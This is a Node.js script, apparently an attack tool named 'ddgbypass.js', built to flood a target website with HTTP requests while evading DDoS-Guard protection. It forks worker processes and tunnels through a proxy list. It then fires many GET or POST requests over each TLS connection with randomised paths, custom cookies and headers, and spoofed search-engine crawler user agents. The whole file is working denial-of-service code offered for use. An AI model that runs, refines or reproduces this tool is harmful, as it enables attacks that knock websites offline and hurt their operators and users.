process.on('uncaughtException', function(er) {
    //console.error(er)
});
process.on('unhandledRejection', function(er) {
    //console.error(er)
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const randstr = require('randomstring')
const url = require('url');

var path = require("path");
const cluster = require('cluster');

function ra() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":4
    });
    return rsdat;
}

let headerbuilders;

let COOKIES = undefined;
let POSTDATA = undefined;

var fileName = __filename;
var file = path.basename(fileName);
let randomparam = false;

if (process.argv.length < 8){
    console.log('BYPASS DDOS-GUARD | BY @H0LLS');
    console.log('node ddgbypass.js "GET/POST/HEAD" "https://domain.ru" "proxy/good.txt" "time/500" "rate/64" "slots/10" + cookie="" headerdata="" if POST, postdata="")');
    process.exit(0);
}

process.argv.forEach((ss) => {
    if (ss.includes("cookie=")){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=")){
        if (process.argv[2].toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("(!) Custom RandomString");
    } else if (ss.includes("headerdata=")){
        headerbuilders = "";
        const hddata = ss.slice(11).split('""')[0].split("&");
        for (let i = 0; i < hddata.length; i++) {
            const head = hddata[i].split("=")[0];
            const dat = hddata[i].split("=")[1];
            headerbuilders += `\r\n${head}: ${dat}`
        }
    }
});
if (COOKIES !== undefined){
    console.log("(!) Custom Cookie Mode");
} else {
    COOKIES = ""
}
if (headerbuilders !== undefined){
    console.log("(!) Custom HeaderData Mode");
}
if (POSTDATA !== undefined){
    console.log("(!) Custom PostData Mode");
} else {
    POSTDATA = ""
}

if (cluster.isMaster){
    for (let i = 0; i < process.argv[7]; i++){
        cluster.fork();
    }
    console.log("BYPASS DDG | SENT BY @H0LLS")

    setTimeout(() => {
        process.exit(1);
    }, process.argv[5] * 1000);
} else {
    startflood();
}

var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

var parsed = url.parse(target);
process.setMaxListeners(0);

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

const UAs = [
	"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36",
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
	"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"(Various mobile device types) (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36 (compatible; Google-Read-Aloud; +https://developers.google.com/search/docs/advanced/crawling/overview-google-crawlers)",
	"Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://developers.google.com/search/docs/advanced/crawling/overview-google-crawlers)",
	"Mozilla/5.0 (X11; GNU/Windows 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.16.2.1-e99c70fff409",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4183.121 Safari/537.36 (compatible; Cloudflare SpeedTest/1.0; +https://blog.cloudflare.com/new-speed-page/)",
	"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
	"Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
	"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Apache-HttpClient/4.5.7 (Java/11.0.11)",
	"Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
	"Curl/1.0.0",
	"-",
	"a.pr-cy.ru",
	"AdsBot-Google (+http://www.google.com/adsbot.html)",
	"AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
	"Apache-HttpClient/4.5 (Java/1.8.0_60)",
	"eSyndiCat Bot",
	"facebookexternalhit/1.1",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
	"Google favicon",
	"Googlebot-Image/1.0",
	"GuzzleHttp/6.1.0 curl/7.26.0 PHP/5.5.29-1~dotdeb+7.1",
	"GuzzleHttp/6.1.0 curl/7.35.0 PHP/5.6.14-1+deb.sury.org~trusty+1",
	"Java/1.4.1_04",
	"Java/1.8.0_60",
	"LinksMasterRoBot/0.01 (http://www.linksmaster.ru)",
	"LinkStats Bot",
	"ltx71 - (http://ltx71.com/)",
	"Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)",
	"Mozilla/5.0 (compatible; archive.org_bot; Wayback Machine Live Record; +http://archive.org/details/archive.org_bot)",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; CNCat/4.2; +http://www.cn-software.com/en/cncat/robot/)",
	"Mozilla/5.0 (compatible; CNCat/4.2; +http://www.vipwords.com/en/cncat/robot/)",
	"Mozilla/5.0 (compatible; DeuSu/5.0.2; +https://deusu.de/robot.html)",
	"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)/1.8 (InfoSeek crawler; http://www.infoseek.com; crawler@infoseek.com)",
	"Mozilla/5.0 (compatible; Google-Site-Verification/1.0)",
	"Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)",
	"Mozilla/5.0 (compatible; linkdexbot/2.2; +http://www.linkdex.com/bots/)",
	"Mozilla/5.0 (compatible; LinkpadBot/1.06; +http://www.linkpad.ru)",
	"Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)",
	"Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Fast/2.0; +http://go.mail.ru/help/robots)",
	"Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)",
	"Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)",
	"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
	"Mozilla/5.0 (compatible; NetSeer crawler/2.0; +http://www.netseer.com/crawler.html; crawler@netseer.com)",
	"Mozilla/5.0 (compatible; openstat.ru/Bot)",
	"Mozilla/5.0 (compatible; SemrushBot/0.99~bl; +http://www.semrush.com/bot.html)",
	"Mozilla/5.0 (compatible; SputnikFaviconBot/1.2; +http://corp.sputnik.ru/webmaster)",
	"Mozilla/5.0 (compatible; statdom.ru/Bot; +http://statdom.ru/bot.html)",
	"Mozilla/5.0 (compatible; StatOnlineRuBot/1.0)",
	"Mozilla/5.0 (compatible; vkShare; +http://vk.com/dev/Share)",
	"Mozilla/5.0 (compatible; WebArtexBot; +http://webartex.ru/)",
	"Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)",
	"Mozilla/5.0 (compatible; YaDirectFetcher/1.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; YaDirectFetcher/1.0; Dyatel; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; YandexDirect/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots DEV)",
	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01e.yandex.ru)",
	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01g.yandex.ru)",
	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01i.yandex.ru)",
	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtweb01t.yandex.ru)",
	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; YandexMetrika/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)",
];

function startflood(){
    if (process.argv[2].toUpperCase() == "POST"){
        if (randomparam){
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("POST" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                
                        tlsConnection.on('data', function (data) {
                            return;
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("POST" + ' ' + parsed.path.replace("%RAND%",ra()) + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                
                        tlsConnection.on('data', function (data) {
                            return;
                        });
                    });
                    req.end();
                });
        }
    } else if (process.argv[2].toUpperCase() == "GET"){
        if (randomparam) {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}` + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                        tlsConnection.on('data', function(data) {
                        });
                    });
                    req.end();
                });
        }
    }
}